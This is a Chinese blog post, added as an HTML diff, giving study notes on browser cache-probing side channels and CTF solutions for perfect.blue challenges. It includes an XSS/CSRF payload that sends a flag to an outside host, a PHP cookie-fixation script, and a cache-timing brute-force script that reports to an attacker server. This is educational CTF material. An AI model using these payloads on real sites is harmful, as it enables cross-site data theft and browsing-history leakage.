@@ -1,0 +1,580 @@
+<!DOCTYPE html>
+<html lang="en" color-mode="dark">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="Siebene@" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      Cache-Probing-Note 
+      
+      
+      |
+    
+     Siebene@ Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+  <!-- clipboard -->
+  
+    <script src="https://unpkg.com/clipboard@2/dist/clipboard.min.js"></script>
+    
+<script src="/js/codeCopy.js"></script>
+
+  
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Siebene@</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">Cache-Probing-Note</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="Update time"></i>
+          2021-10-16 22:52:01
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="Tags"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/WEB/" title="WEB">
+                    <b>#</b> WEB
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h1 id="Cache-Probing学习记录"><a href="#Cache-Probing学习记录" class="headerlink" title="Cache Probing学习记录"></a>Cache Probing学习记录</h1><p>自己之前记了点笔记，参考了许多大哥写的博客</p>
+<p>写得挺丑陋的，自己看看就好</p>
+<h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><p>Cache Probing正如其名就是缓存探测，也是Leak众多方法中的一种。</p>
+<p>某些资源会被浏览器缓存起来</p>
+<p>某些情景下，如果攻击者能够通过某种信道探测到这个资源加载的状态，这个状态的信息可以告诉攻击者，受害者是否之前访问过这个资源</p>
+<h2 id="攻击手法"><a href="#攻击手法" class="headerlink" title="攻击手法"></a>攻击手法</h2><h3 id="Timing"><a href="#Timing" class="headerlink" title="Timing"></a>Timing</h3><p>也是最容易想到的，自然而然从浏览器本地缓存中加载和网上加载的所用的时间不同，那么就依据返回的时间来判断加载状态</p>
+<p>最好用的办法其实就是<code>await fetch(url, &#123; &#39;cache&#39;: &#39;force-cache&#39; &#125;)</code></p>
+<p>然后获取时间就行了</p>
+<h3 id="Error-Events"><a href="#Error-Events" class="headerlink" title="Error Events"></a>Error Events</h3><p><strong>CORS</strong></p>
+<p>考虑一下这种情况</p>
+<p>如果从<code>target.com</code>请求托管在<code>server.com</code>上的资源，则在响应头会返回：Access-Control-Allow-origin:target.com。如果资源已缓存，则此信息将与资源一起存储在浏览器缓存中。因此，如果攻击者<code>attacker.com</code>试图获取相同的资源，则有两种可能的情况： </p>
+<ul>
+<li><p>该资源不在缓存中：该资源可以与Access-Control-Allow-Origin:attacker.com标头一起提取和存储。 </p>
+</li>
+<li><p>资源已在缓存中：尝试从缓存中提取资源，但由于ACAO标头值与请求来源不匹配，它也将生成CORS错误。</p>
+</li>
+</ul>
+<p><strong>AbortController</strong></p>
+<p><code>https://developer.mozilla.org/zh-CN/docs/Web/API/AbortController</code></p>
+<p>上面的文章详细的介绍了AbortController</p>
+<p>我简单的理解就是可以拿来中断并且报错</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">ifCached</span>(<span class="params">url, purge = <span class="literal">false</span></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> controller = <span class="keyword">new</span> <span class="title class_">AbortController</span>();</span><br><span class="line">    <span class="keyword">var</span> signal = controller.<span class="property">signal</span>;</span><br><span class="line">    <span class="comment">// After 9ms, abort the request (before the request was finished).</span></span><br><span class="line">    <span class="comment">// The timeout might need to be adjusted for the attack to work properly.</span></span><br><span class="line">    <span class="comment">// Purging content seems to take slightly less time than probing</span></span><br><span class="line">    <span class="keyword">var</span> wait_time = (purge) ? <span class="number">3</span> : <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">var</span> timeout = <span class="keyword">await</span> <span class="built_in">setTimeout</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        controller.<span class="title function_">abort</span>();</span><br><span class="line">    &#125;, wait_time);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// credentials option is needed for Firefox</span></span><br><span class="line">        <span class="keyword">let</span> options = &#123;</span><br><span class="line">            <span class="attr">mode</span>: <span class="string">&quot;no-cors&quot;</span>,</span><br><span class="line">            <span class="attr">credentials</span>: <span class="string">&quot;include&quot;</span>,</span><br><span class="line">            <span class="attr">signal</span>: signal</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// If the option &quot;cache: reload&quot; is set, the browser will purge</span></span><br><span class="line">        <span class="comment">// the resource from the browser cache</span></span><br><span class="line">        <span class="keyword">if</span>(purge) options.<span class="property">cache</span> = <span class="string">&quot;reload&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">await</span> <span class="title function_">fetch</span>(url, options);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="comment">// When controller.abort() is called, the fetch will throw an Exception</span></span><br><span class="line">        <span class="keyword">if</span>(purge) <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The resource was purged from the cache&quot;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The resource is not cached&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// clearTimeout will only be called if this line was reached in less than</span></span><br><span class="line">    <span class="comment">// wait_time which means that the resource must have arrived from the cache</span></span><br><span class="line">    <span class="built_in">clearTimeout</span>(timeout);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;The resource is cached&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// purge https://example.org from the cache</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">ifCached</span>(<span class="string">&#x27;https://example.org&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Put https://example.org into the cache</span></span><br><span class="line"><span class="comment">// Skip this step to simulate a case where example.org is not cached</span></span><br><span class="line"><span class="title function_">open</span>(<span class="string">&#x27;https://example.org&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// wait 1 second (until example.org loads)</span></span><br><span class="line"><span class="keyword">await</span> <span class="keyword">new</span> <span class="title class_">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, <span class="number">1000</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check if https://example.org is in the cache</span></span><br><span class="line"><span class="keyword">await</span> <span class="title function_">ifCached</span>(<span class="string">&#x27;https://example.org&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="限制"><a href="#限制" class="headerlink" title="限制"></a>限制</h3><p>从别人博客偷的图</p>
+<p>可以很详细的看到缓存的资源也是存在隔离的，cache key 只看 eTLD(有效顶级域名,例如.com.cn,.github.io等)+1</p>
+<p><img src="/2021/10/16/Cache-Probing-Note/1.png" alt="Cache-Probing-Note"></p>
+<p>以上图为例第一次请求，那么<code>Cache Key:&#123;xx&#125;</code>就包含了窗口的网址，内嵌窗口的网址，资源的地址</p>
+<p>如果攻击者想要访问到这次的缓存，那么他的<code>Cache Key:&#123;attacker-site,attacker-site,http://x.example/doge.png&#125;</code>，自然而然不能访问到该图片的缓存，因为这里有两个值都不相同</p>
+<p>而且同源策略似乎还是存在的，也就是同源才能分享缓存</p>
+<p>不过我看大哥说的是在某些版本的headless chrome是不会管<code>Cache Key</code>的，所以出现了这样的配置，就不用考虑这么多了，而且子域名和端口都是被忽略掉的，比如<code>http://wqd.example.org</code>最后只会存<code>http://example.org</code>下来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">....</span><br><span class="line">headless: true//好像这个配置默认就是开启的</span><br></pre></td></tr></table></figure>
+
+<p>我在本地也简单得验证了下，写得很简陋，就不放出来了</p>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h4 id="例题1"><a href="#例题1" class="headerlink" title="例题1"></a>例题1</h4><p>TBDXSS</p>
+<p>题目就是有个从你cookies里获取文本并显示的note路由，当然可以去修改这个cookies</p>
+<p>flag按照传统就是在admin的笔记里</p>
+<p>self-xss配合csrf如何才能泄露出admin的笔记呢，一般来说有同源的xss就能直接插了，关键是这里你直接x他会覆盖到笔记的内容，怎么解决这个问题呢？</p>
+<p>忘了从哪里剽窃的payload了</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>hello world<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://tbdxss.chal.perfect.blue/change_note&quot;</span> <span class="attr">id</span>=<span class="string">&quot;noteform&quot;</span> <span class="attr">method</span>=<span class="string">POST</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;payload&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;100&quot;</span> <span class="attr">name</span>=<span class="string">&quot;data&quot;</span> <span class="attr">form</span>=<span class="string">&quot;noteform&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 开一个窗口并命名</span></span></span><br><span class="line"><span class="language-javascript">        <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;https://tbdxss.chal.perfect.blue/note&#x27;</span>, <span class="string">&#x27;flagWindow&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">        <span class="comment">// 这里想干啥不要解释吧</span></span></span><br><span class="line"><span class="language-javascript">        payload.<span class="property">value</span> = <span class="string">&quot;HOW NOW BROWN COW!\x3Cscript&gt;let flagWindow = window.open(&#x27;&#x27;, &#x27;flagWindow&#x27;); let flag = flagWindow.document.documentElement.innerText; fetch(&#x27;https://ip/?flag=&#x27; + flag);\x3C/script&gt;\x3Cimg src=&#x27;https://a700-68-51-145-201.ngrok.io/delayThen404&#x27;&gt;&quot;</span></span></span><br><span class="line"><span class="language-javascript">        noteform.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;https://a700-68-51-145-201.ngrok.io/delayThen404&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;window.location.href=&#x27;https://tbdxss.chal.perfect.blue/note&#x27;&quot;</span>&gt;</span>//延时并跳转触发，上面window.open(&#x27;&#x27;, &#x27;flagWindow&#x27;);是缓存的内容</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>我看到还有位大哥是用windows.opener做的，其实也行</p>
+<h4 id="例题2"><a href="#例题2" class="headerlink" title="例题2"></a>例题2</h4><p>名字未知，一位大哥出的</p>
+<p>题目就是有个写笔记的功能，还有个去匹配你写的笔记的功能，匹配成功会去加载一个图片，失败会加载另一个图片。这些功能完全都是客户端来实现的，也就是你的笔记都是存在localStorage的</p>
+<p>那么就使用最经典的方法去探测图片获取的时间就行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var endTime = performance.now();</span><br><span class="line">duration = endTime - startTime;</span><br><span class="line">console.log(duration);</span><br></pre></td></tr></table></figure>
+
+<h4 id="例题3"><a href="#例题3" class="headerlink" title="例题3"></a>例题3</h4><p>Vault的一个非预期</p>
+<p>主要有个<code>/12/24/8/31/…/</code>的path可以让你写入内容到里面去，没有XSS。然后它有个bot会先浏览这个网站（<code>http://vault.chal.perfect.blue/</code>），然后随机点击十四层进到一个有十四层深的path中，然后在那个页面上submit flag之后visit到你指定的任意网站，这个题目的目标是要想办法取得bot在浏览你的页面之前最后所在的那个页面的url，然后就能获得flag了</p>
+<p>以下是这位大哥写的payload</p>
+<p><code>index.html</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        <span class="title function_ invoke__">open</span>(location.href + <span class="string">&#x27;submit.php&#x27;</span>, <span class="string">&#x27;_blank&#x27;</span>)</span><br><span class="line">        <span class="title function_ invoke__">open</span>(location.href + <span class="string">&#x27;opennote.php&#x27;</span>, <span class="string">&#x27;_blank&#x27;</span>)</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>opennote.php</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_ invoke__">setTimeout</span>(() =&gt; &#123; <span class="title function_ invoke__">open</span>(<span class="string">&#x27;https://tbdxss.chal.perfect.blue/note&#x27;</span>, <span class="string">&#x27;_blank&#x27;</span>) &#125;, <span class="number">1000</span>)&lt;/script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><code>submit.php</code>:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;xss.js&#x27;</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="string">&#x27;&lt;script&gt;&#x27;</span>.<span class="variable">$xss</span>.<span class="string">&#x27;&lt;/script&gt;&#x27;</span>;</span><br><span class="line"><span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(<span class="string">&#x27;https://tbdxss.chal.perfect.blue/change_note&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POST, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_POSTFIELDS, <span class="title function_ invoke__">http_build_query</span>([</span><br><span class="line">    <span class="string">&#x27;data&#x27;</span> =&gt; <span class="variable">$payload</span></span><br><span class="line">]));</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_FOLLOWLOCATION, <span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onHeader</span>(<span class="params"> <span class="variable">$curl</span>, <span class="variable">$header_line</span> </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$sess</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$header_line</span>, <span class="string">&#x27;session=&#x27;</span>) !== <span class="literal">false</span>)&#123;</span><br><span class="line">        <span class="variable">$sess</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;;&#x27;</span>, <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;session=&#x27;</span>, <span class="variable">$header_line</span>)[<span class="number">1</span>])[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$header_line</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADERFUNCTION, <span class="string">&quot;onHeader&quot;</span>);</span><br><span class="line"><span class="variable">$response</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$js</span> = <span class="string">&#x27;document.cookie = &quot;session=&quot; + &#x27;</span>.<span class="title function_ invoke__">json_encode</span>(<span class="variable">$sess</span>).<span class="string">&#x27;+ &quot;; path=/note&quot;; location.href = &quot;http://tbdxss.chal.perfect.blue/note&quot;;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;form action=<span class="string">&quot;https://tbdxss.chal.perfect.blue/change_note&quot;</span> method=<span class="string">&quot;POST&quot;</span> id=f&gt;</span><br><span class="line">&lt;textarea name=<span class="string">&quot;data&quot;</span>&gt;&lt;/textarea&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">f.data.value = <span class="string">&quot;SET COOKIE&lt;script&gt;&quot;</span> + <span class="meta">&lt;?=</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$js</span>) <span class="meta">?&gt;</span> + <span class="string">&quot;&lt;/&quot;</span> + <span class="string">&quot;script&gt;&quot;</span></span><br><span class="line">f.<span class="title function_ invoke__">submit</span>()</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><code>xss.js:</code></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">report</span> = s =&gt; <span class="title function_">fetch</span>(location.<span class="property">protocol</span> + <span class="string">&#x27;//YOUR_SERVER/report.php&#x27;</span>, &#123; <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>, <span class="attr">body</span>: s &#125;)</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">getLoadTime</span> = <span class="keyword">async</span> url =&gt; &#123;</span><br><span class="line">	<span class="keyword">const</span> start = performance.<span class="title function_">now</span>()</span><br><span class="line">	<span class="keyword">await</span> <span class="title function_">fetch</span>(url, &#123; <span class="attr">cache</span>: <span class="string">&#x27;force-cache&#x27;</span>, <span class="attr">mode</span>: <span class="string">&#x27;no-cors&#x27;</span> &#125;)</span><br><span class="line">	<span class="keyword">return</span> performance.<span class="title function_">now</span>() - start</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">const</span> <span class="title function_">buildUrl</span> = parts =&gt; location.<span class="property">protocol</span> + <span class="string">&#x27;//vault.chal.perfect.blue/&#x27;</span> + parts.<span class="title function_">join</span>(<span class="string">&#x27;/&#x27;</span>) + <span class="string">&#x27;/&#x27;</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onload</span> = <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">5</span>; i++) &#123;</span><br><span class="line">			<span class="comment">// warmup</span></span><br><span class="line">			<span class="keyword">await</span> <span class="title function_">getLoadTime</span>(location.<span class="property">protocol</span> + <span class="string">&#x27;//vault.chal.perfect.blue/&#x27;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">const</span> <span class="title function_">brute</span> = <span class="keyword">async</span> parts =&gt; &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="number">32</span>; i++) &#123;</span><br><span class="line">				<span class="keyword">const</span> t = <span class="keyword">await</span> <span class="title function_">getLoadTime</span>(<span class="title function_">buildUrl</span>(parts.<span class="title function_">concat</span>([i])))</span><br><span class="line">				<span class="keyword">if</span> (t &lt; <span class="number">5</span>) &#123;</span><br><span class="line">					<span class="keyword">const</span> nextParts = parts.<span class="title function_">concat</span>([i])</span><br><span class="line">					<span class="title function_">report</span>(<span class="title function_">buildUrl</span>(nextParts))</span><br><span class="line">					<span class="keyword">return</span> <span class="title function_">brute</span>(nextParts)</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">await</span> <span class="title function_">brute</span>([])</span><br><span class="line">	&#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">		<span class="title function_">report</span>(e.<span class="title function_">toString</span>())</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">report</span>(<span class="string">&#x27;sancheck: &#x27;</span> + location.<span class="property">href</span>)</span><br></pre></td></tr></table></figure>
+
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="Update time"></i>
+              2021-10-16 22:52:01
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="Tags"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/WEB/" title="WEB">
+                        <b>#</b> WEB
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2021/11/22/Latte-SSTI-Payloads%E6%80%BB%E7%BB%93/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Cache-Probing%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95"><span class="toc-text">Cache Probing学习记录</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A6%82%E5%BF%B5"><span class="toc-text">概念</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95"><span class="toc-text">攻击手法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Timing"><span class="toc-text">Timing</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Error-Events"><span class="toc-text">Error Events</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6"><span class="toc-text">限制</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%981"><span class="toc-text">例题1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%982"><span class="toc-text">例题2</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%983"><span class="toc-text">例题3</span></a></li></ol></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
